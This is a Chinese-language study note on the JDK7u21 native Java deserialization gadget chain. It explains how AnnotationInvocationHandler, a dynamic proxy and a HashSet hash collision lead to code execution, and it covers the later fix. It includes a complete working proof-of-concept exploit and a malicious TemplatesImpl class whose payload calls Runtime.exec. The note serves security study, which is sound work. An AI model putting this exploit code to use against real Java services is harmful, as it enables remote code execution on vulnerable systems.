# 反序列化基础篇-原生反序列化利用链 JDK7u21
# 0x00 前言
在之前的学习过程中，我们已经学习了部分CC链以及CB链，但这些都需要目标环境存在合适的第三方库时才能利用。实际上，在旧的Java版本中，存在不依赖第三方库的Java反序列化利用链。

这条链就是 `JDK7u21` ，它适用于 `Java 7u21` 及以前的版本。
# 0x01 环境搭建
## 1.1 JDK版本及sun包源码
- 影响版本：Java <= 7u21
- 下载sun包源码便于调试

原生反序列化利用链 `JDK7u21` 对 `JDK` 版本有要求，需在 `7u21` 之前。 原生反序列化利用链 `JDK7u21` 需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载 `sun` 包，把 `src/share/classes` 中的 `sun` 文件夹 放到 `oracle jdk7u21` 的 `src` 文件夹下。

`sun` 包下载地址：https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/3f06e091a238

<div align=center><img width="641" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/d36c39fe-5833-4150-a2fe-5b34479fc006" /></div>

将 `sun` 包复制到对应 `jdk` 的 `src` 目录下（Macbook是在 `/Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/src` 下）

![image](https://github.com/reidmu/sec-note/assets/84888757/52530a7a-de39-413c-8782-4a85550b8037)

然后在 IDEA 中，`File` --> `Project Structure` --> `SDKs` ，将 `src` 目录的路径加到 `Sourcepath` 中去：

![image](https://github.com/reidmu/sec-note/assets/84888757/e5c49fb2-bca7-4028-a37c-4e9bd7e5bd34)

## 1.2 添加 javassist.jar
编写 JDK7u21 POC 时用到了 `javassist` ，这是一个字节码操纵的第三方库，可以帮助我将恶意类 `evil.EvilTemplatesImpl` 生成字节码再交给 `TemplatesImpl` 。

`javassist` 下载地址：https://github.com/jboss-javassist/javassist/releases

(下个旧版本的 `javassist`，否则会报错 `Exception in thread "main" java.lang.UnsupportedClassVersionError: javassist/ClassPool : Unsupported major.minor version 52.0`)

然后在 IDEA 中，`File` --> `Project Structure` --> `SDKs` 将 `javassist.jar` 目录的路径加到 `ClassPath` 中去：

![image](https://github.com/reidmu/sec-note/assets/84888757/d2785e6a-5c2a-40b0-a371-c1ed8590bee8)

# 0x02 JDK7u21的核心原理
## 2.1 危险方法 AnnotationInvocationHandler#equalsImpl

经过之前 `CommonsCollections` 的这些利用链学习，我们需要知道什么是某条反序列化利用链的核心，是 `TemplatesImpl` 或某个类的 `readObject` 方法吗？

不是，反序列化利用链的核心是触发“动态方法执行”的地方，比如：

- `CommonsCollections` 系列反序列化的核心点是那一堆 `Transformer` ，特别是其中的 `InvokerTransformer` 、 `InstantiateTransformer` 。

- `CommonsBeanutils` 反序列化的核心点是 `PropertyUtils#getProperty` ，因为这个方法会触发任意对象的 `getter` 方法。

- `JDK7u21` 的核心点就是 `sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl` ，因为这个 `AnnotationInvocationHandler#equalsImpl` 方法中也能够通过反射进行任意代码执行。

对于 `sun.reflect.annotation.AnnotationInvocationHandler` 这个类，在学习CC1的时候，我们曾经见过，当时是如下调用链：

```java
AnnotationInvocationHandler#readObject()
	-> AbstractInputCheckedMapDecorator#setValue()    // AbstractInputCheckedMapDecorator 是 TransformedMap 的父类
		-> TransformedMap#checkSetvalue()
			-> valueTransformer#transform(value)
				-> InvokerTransformer#transform()
```

在 `JDK7u21` 这条原生反序列化利用链中，我们要用到的核心方法是 `AnnotationInvocationHandler#equalsImpl` 方法，这里放一下 `AnnotationInvocationHandler` 类中的关键代码：

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
    
    private Boolean equalsImpl(Object o) {
        if (o == this)
            return true;

        if (!type.isInstance(o))
            return false;
        for (Method memberMethod : getMemberMethods()) {
            String member = memberMethod.getName();
            Object ourValue = memberValues.get(member);
            Object hisValue = null;
            AnnotationInvocationHandler hisHandler = asOneOfUs(o);
            if (hisHandler != null) {
                hisValue = hisHandler.memberValues.get(member);
            } else {
                try {
                    hisValue = memberMethod.invoke(o);
                } catch (InvocationTargetException e) {
                    return false;
                } catch (IllegalAccessException e) {
                    throw new AssertionError(e);
                }
            }
            if (!memberValueEquals(ourValue, hisValue))
                return false;
        }
        return true;
    }
    
    private Method[] getMemberMethods() {
        if (memberMethods == null) {
            memberMethods = AccessController.doPrivileged(
                new PrivilegedAction<Method[]>() {
                    public Method[] run() {
                        final Method[] mm = type.getDeclaredMethods();
                        AccessibleObject.setAccessible(mm, true);
                        return mm;
                    }
                });
        }
        return memberMethods;
    }
}
```

在 `AnnotationInvocationHandler#equalsImpl` 方法中调用了 `getMemberMethods` 方法，在 `getMemberMethods` 方法中，通过 `type.getDeclaredMethods();` 获取了 `this.type` 类中的所有方法并以数组的形式返回；

然后进行循环，利用 `hisValue = memberMethod.invoke(o);` ，依次执行了每个方法；

那么，如果把 `this.type` 设置成一个 `Templates` 对象，就会遍历执行里面的所有的方法，自然就会执行 `newTransformer()` 或 `getOutputProperties()` 方法，然后进一步触发我们之前所学的 `TemplatesImpl` 利用链，进而执行命令；这就是 `JDK7u21` 的核心原理。

所以我们现在的思路是找到如何调用 `equalsImpl` 。

```java
???
  --> AnnotationInvocationHandler#equalsImpl
    --> TemplatesImpl#getOutputProperties()
      --> TemplatesImpl#newTransformer() ->
        --> TemplatesImpl#getTransletInstance() -> 
            --> TemplatesImpl#defineTransletClasses() -> 
                --> TemplatesImpl$TransletClassLoader#defineClass()
```

## 2.2 调用 equalsImpl
现在我们需要找到如何通过反序列化调用了 `AnnotationInvocationHandler#equalsImpl` 方法，`equalsImpl` 是一个私有方法，在 `AnnotationInvocationHandler#invoke` 中被调用了。

![image](https://github.com/reidmu/sec-note/assets/84888757/afc8371c-4de5-4cab-aeec-f396b1b34286)

`AnnotationInvocationHandler` 实现了 `InvocationHandler` 接口，因此我们想到一个概念：动态代理。

创建一个 `proxy` 对象，其 `handler` 是 `AnnotationInvocationHandler` 的实例；

当调用 `proxy` 类的 `equals` 方法时，就能调用到 `handler#invoke` 的对应方法，实现完整的利用链。

> **动态代理**
> 
> `AnnotationInvocationHandler#invoke` 也是我们在 `CC1` 中学习过的，当时涉及到动态代理的概念。
> 
> Java 作为一门静态语言，如果想劫持一个对象内部的方法调用，我们需要用到 `java.reflect.Proxy` ：

```java
// 创建代理类对象
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class}, handler);
```

> - `Proxy.newProxyInstance` 的第一个参数是 `ClassLoader`，我们用默认的即可；
> - 第二个参数是我们需要代理的对象集合；
> - 第三个参数是一个实现了 `InvocationHandler` 接口的对象，里面包含了具体代理的逻辑。
>
> `InvocationHandler` 接口只有一个 `invoke` 方法，`InvocationHandler` 接口的实现类必须实现 `invoke` 方法， `AnnotationInvocationHandler` 就是一个符合要求的 `handler` 实现类。
>
> `Proxy` 类在创建 **代理类对象** 时，如果指定了 `handler`（处理器），那么不管用户调用 **代理类对象** 的什么方法，该方法都是先调用 **handler** 的 `invoke` 方法。


`sun.reflect.annotation.AnnotationInvocationHandler` 这个类所创建的实例可以作为一个 `handler`。

只要调用 `proxy` 对象的任意方法，就会进入到 `AnnotationInvocationHandler#invoke` 方法中。

执行 `invoke` 时，被传入的第一个参数是这个 `proxy` 对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。

```java
public Object invoke(Object proxy, Method method, Object[] args)
    	throws Throwable;
}
```

结合 `AnnotationInvocationHandler#invoke` 的代码看，当调用的方法名等于 `equals` ，且仅有一个 `Object` 类型参数时，就会进入到 `if` 句中，进而触发危险方法 `AnnotationInvocationHandler#equalsImpl` 。

![image](https://github.com/reidmu/sec-note/assets/84888757/713bce2a-e485-4619-810b-ebf2c1747f80)

所以我们现在的问题变成，需要找到一个方法，在反序列化时对 `proxy` 对象调用 `equals` 方法。

目前的利用链思路如下：

```java
???
  --> proxy实例#equals
    --> AnnotationInvocationHandler#invoke
    	--> AnnotationInvocationHandler#equalsImpl
            --> TemplatesImpl#getOutputProperties()
            	--> TemplatesImpl#newTransformer() ->
                    --> TemplatesImpl#getTransletInstance() -> 
                        --> TemplatesImpl#defineTransletClasses() -> 
                            --> TemplatesImpl$TransletClassLoader#defineClass()
```


## 2.3 调用 equals
比较Java对象时，常用到两个方法：
- compareTo
- equals

`compareTo` 实际上是 `java.lang.Comparable` 接口的方法，在 `java.util.PriorityQueue` 中，通常被实现用于比较两个对象的值是否相等。

任意Java对象都拥有 `equals` 方法，它通常用于比较两个对象是否是同一个引用；
有种常见的会调用 `equals` 的场景就是集合 `set` ，因为 `set` 中存储的对象不允许重复，所以在添加对象的时候，会涉及到比较操作，这个比较操作就是由 `equals` 来完成的。

我们来了解一下Java中的两种数据结构：`HashMap` 和 `HashSet` 。

`HashMap`：`HashMap` 是一个散列表，也就是数据结构里面的哈希表，它里面存储的内容是键值对(key-value)映射；哈希表是由 `数组+链表` 来实现的，数组的索引由哈希表的 `key.hashcode()` 经过计算得到；也就是说当有两对键值对，它们键名的 `hashcode()` 相同时，数组的索引也会相同，就会排到同一个链表后面，如下图所示：

<div align=center><img width="641" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/0fbd1010-a6ab-4498-88cc-72034097a3fb" /></div>

`HashSet`：是基于 `HashMap` 来实现的一个集合，是一个不允许有重复元素的集合。既然它不允许重复，那么在添加对象的时候，就一定会涉及到比较操作，会调用到 `equals`

看看 `HashSet` 的 `readObject` 方法：

```java
public class HashSet<E> extends AbstractSet<E> implements Set<E>, Cloneable, java.io.Serializable
{ 
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // 按适当的顺序读入所有元素。
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT); // 这里将对象放入一个HashMap的key处
        }
    }
}
```

跟进 `HashMap` 中的 `put` 方法：
可以看到，在 `put` 方法中确实可以触发 `equals` ，但是，触发这个 `equals` 是有条件的，当 `e.hash == hash` 成立以及 `(k = e.key) == key` 不成立，也就是说这两个对象的 `hash` 值要相等且这两个对象不能相等，这样才能触发到 `key.equals(k)` 。

![image](https://github.com/reidmu/sec-note/assets/84888757/50adaebf-3b1c-420b-8ae1-d6fd6c2011da)


那么我们就是要创建一个 `sun.reflect.annotation.AnnotationInvocationHandler` 实例对象 `handler` ，构造函数传入的 `type` 是 `TemplateImpl` 对象，构造函数传入的 `map` 待下节讨论，然后用这个 `handler` 创建 `Proxy` 对象；

让 `proxy` 对象的 `hash` 值，等于单独的 `TemplateImpl` 对象的 `hash` 值，这样就可以进入到 `HashMap#equals`，比较对象的引用是否相等 。

```java
HashSet#readObject
    --> HashMap#put
        --> HashMap#equals   // 要让proxy对象的hash值，等于TemplateImpl对象的hash值，才能走到 equals
            --> AnnotationInvocationHandler#invoke
            	--> AnnotationInvocationHandler#equalsImpl
                    --> TemplatesImpl#getOutputProperties()
                    	--> TemplatesImpl#newTransformer() ->
                            --> TemplatesImpl#getTransletInstance() -> 
                                --> TemplatesImpl#defineTransletClasses() -> 
                                    --> TemplatesImpl$TransletClassLoader#defineClass()
```

# 2.4 构造 hash 相等
> 🚩 equals() 方法和 hashCode() 方法在判断对象相等的作用区别是什么？
> 
> `equals()` 方法的作用是比较两个对象的内容是否相等。默认情况下，`equals()` 方法继承自 `Object` 类，用于比较对象的引用是否相等（即两个对象是否指向同一内存地址）。
> 
> `hashCode()` 方法的作用是计算对象的哈希码。哈希码是一个整数值，用于快速确定对象在哈希表等数据结构中的存储位置。在 `HashSet`、`HashMap` 等集合类中，哈希码用于确定对象的存储位置，并用于快速查找和比较对象。为了正确使用哈希表等数据结构，你需要确保相等的对象具有相等的哈希码。默认情况下，`hashCode()` 方法继承自 `Object` 类，它根据对象的内存地址生成一个哈希码。

要构造 `proxy` 对象的 `hash` 值，等于单独的 `TemplateImpl` 对象的 `hash` 值，首先看看 `hash` 值如何计算的，主要是下面两行代码：

![image](https://github.com/reidmu/sec-note/assets/84888757/0cf18e66-b4ac-4285-b684-c3bcaa311bfc)

跟进 `hash` 函数。

发现变量只有一个，就是 `k.hashCode()` ，这个 `k` 就是 `key` ，所以就是 `key.hashCode()` 。

所以 `proxy` 对象与单独的 `TemplateImpl` 对象的“哈希”是否相等，仅取决于这两个对象的 `hashCode()` 是否相等。

`TemplateImpl` 的 `hashCode()` 是一个 `Native` 方法，每次运行都会发生变化，理论上是无法预测的，所以想让 `proxy` 的 `hashCode()` 与之相等，只能寄希望于 `proxy.hashCode()` 。

![image](https://github.com/reidmu/sec-note/assets/84888757/46393599-50df-483a-ac83-1f7d35b11e0b)

`proxy` 对象是我们利用动态代理创建的实例，那么调用它的任何方法，包括调用 `hashCode()` 也会进入到 `AnnotationInvocationHandler#invoke` 中，然后调用 `AnnotationInvocationHandler#hashCodeImpl()` 。

![image](https://github.com/reidmu/sec-note/assets/84888757/a2f37d36-2bb4-46a2-9ee6-39ab4c600a1b)

跟进 `AnnotationInvocationHandler#hashCodeImpl()` 方法，这个方法遍历了 `memberValues` 这个 `Map` 中的每个 `key` 和 `value` ，计算每个 `(127 * key.hashCode()) ^ value.hashCode()` 并求和。

![image](https://github.com/reidmu/sec-note/assets/84888757/6477e450-68ee-4b71-9e9d-41626690a927)

JDK7u21 利用链中使用了一个非常巧妙的方法：
- 当 `memberValues` 中只有一个 `key` 和一个 `value` 时，就只用执行一次，不存在遍历，该哈希简化成 `(127 * key.hashCode()) ^ value.hashCode()`
- 当 `key.hashCode()` 等于 `0` 时，任何数异或 `0` 的结果仍是它本身，所以该哈希简化成 `value.hashCode()` 。
- 当 `value` 设置为 `TemplateImpl` 对象时，`proxy` 对象的 `hash` 值就等于单独的 `TemplateImpl` 对象的 `hash` 值。

也就是说给 `AnnotationInvocationHandler` 的构造函数传入的这个 `memberValues`（就是个 `HashMap`） ，键是 `hashCode()` 为 `0` 的字符串对象，值是这个 `TemplateImpl` 对象，那这个 `proxy` 对象计算的 `hashCode` 就与单独的 `TemplateImpl` 对象本身的 `hashCode` 相等了。

通过一个爆破程序来找一个 `hashcode` 为 `0` 的字符串：

```java
public class bruteHashCode {
    public static void main(String[] args) {
        for (long i = 0; i < 9999999999L; i++) {
            if (Long.toHexString(i).hashCode() == 0) {
                System.out.println(Long.toHexString(i));
            }
        }
    }
}
```

跑出来第一个是 `f5a5a608` ，这个也是 `ysoserial` 中用到的字符串。

## 2.5 利用链梳理及POC构造
放个 `ysoserial` 的利用链：

```java
LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
```

### 2.5.1 POC 构造思路
现在梳理一下构造思路：
- 首先生成恶意 `TemplateImpl` 对象 ，这个对象是为了遍历它的所有方法并执行，以至于会执行到 `newTransformer()` 或 `getOutputProperties()` 方法，进而触发调用链实现命令执行。
- 实例化 `AnnotationInvocationHandler` 对象，由于是内部类我们需要用反射来获取
  - 它的 `type` 属性是一个 `TemplateImpl` 类。
  - 它的 `memberValues` 属性是一个 `Map`，`Map` 只有一个 `key` 和 `value`， `key` 是字符串 `f5a5a608` ，`value` 是前面生成的恶意 `TemplateImpl` 对象。
  - 这个对象也就是我们说的 `Proxy` 类用到的 `handler`。
- 对这个 `AnnotationInvocationHandler` 对象利用 `Proxy.newProxyInstance` 动态生成实现类，生成 `proxy` 对象。
- 最后实例化一个 `HashSet`，这个 `HashSet` 有两个元素，分别是：恶意 `TemplateImpl` 对象和 `proxy` 对象。
- 将 `HashSet` 对象进行序列化。

然后反序列化触发代码执行的过程如下：
- 触发 `HashSet` 的 `readObject` 方法，其中使用 `HashMap` 的 `key` 做去重。
- 去重时计算 `HashSet` 中的两个元素的 `hashCode()` ，因为我们的精心构造，二者的 `hashCode()` 相等，进而触发 `equals()` 方法，进入到代理类的对象的 `invoke` 方法中，即 `AnnotationInvocationHandler#invoke`。
- 调用 `AnnotationInvocationHandler#equalsImpl` 方法
- `equalsImpl` 中遍历 `this.type` 的每个方法并调用
- 因为 `this.type` 是 `TemplatesImpl` 类，所以触发了 `newTransform()` 或 `getOutputProperties()` 方法
- 任意代码执行

### 2.5.2 POC - JDK7u21.java
📒 JDK7u21.java
```java
package org.example.deserialization;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
//import org.apache.commons.codec.binary.Base64;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        // 生成恶意 TemplateImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(templates, "_name", "xxx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值(避免重复调用恶意类)
        HashMap<String, Object> map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 通过反射实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // 将恶意templates设置到map中，替换掉map里之前的元素
        map.put(zeroHashCodeStr, templates);

        // 这个for循环只是用来看看map里现在有什么元素，可以去掉
//        for (Map.Entry<String, Object> entry : map.entrySet()) {
//            String key = entry.getKey();
//            Object value = entry.getValue();
//            System.out.println("Key: " + key + ", Value: " + value);
//        }

//        // 序列化
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(set);
//        oos.close();
//
//        // 反序列化
//        System.out.println(barr);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();

        // 序列化
        serialize(set);
        // 反序列化
        unserialize("ser_JDK7u21.bin");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_JDK7u21.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(obj);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

<img width="1331" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/fe825e6d-ff2b-4e80-bbd1-6c44f5e7f5a9">

### EvilTemplatesImpl.java
```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    }
}
```

# 0x03 修复
这个利用链俗名是 `JDK7u21` ，可以认为它可以在 `7u21` 及以前的版本中使用。

- JDK6
  - Java 的版本是多个分支同时开发的，并不意味着 `JDK7` 的所有东西都一定比 `JDK6` 新，所以，当看到这个利用链适配 `7u21` 的时候，不一定适用于 `JDK6` 全版本。
  -  `JDK6` 公开版本的最新版 `6u45` 仍然存在这条利用链，大概是 `6u51` 的时候修复了这个漏洞，无法确认，因为 `6u45` 之后的版本只能付费获取。

- JDK8
  - JDK8在发布时，JDK7已经修复了这个问题，所以JDK8全版本都不受原生反序列化利用链 `JDK7u21` 的影响。

- JDK7u21 之后的修复
  - [https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e](https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e)
  - `jdk7u25` 的修复方式，是在 `AnnotationInvocationHandler` 的 `readObject()` 方法中尝试将 `this.type` 转换成 `AnnotationType` ，如果转换失败，就 `throw Exception` ，而不是 `JDK7u21` 中的直接 `return` ；实际上这种修复方式仍然存在问题，导致之后又出现一条原生利用链 `JDK8u20` ，之后再另外学习吧。

![image](https://github.com/reidmu/sec-note/assets/84888757/b3ba5f80-9a87-4356-9201-e8f17d561212)

# 0x04 参考链接
- [Java安全漫谈 - 18.原生反序列化利用链JDK7u21](https://wx.zsxq.com/dweb2/index/topic_detail/418484145254248)
- [Java篇之JDK7u21 @arsenetang](http://arsenetang.com/2022/07/29/Java%E7%AF%87%E4%B9%8BJDK7u21/#&gid=1&pid=2)









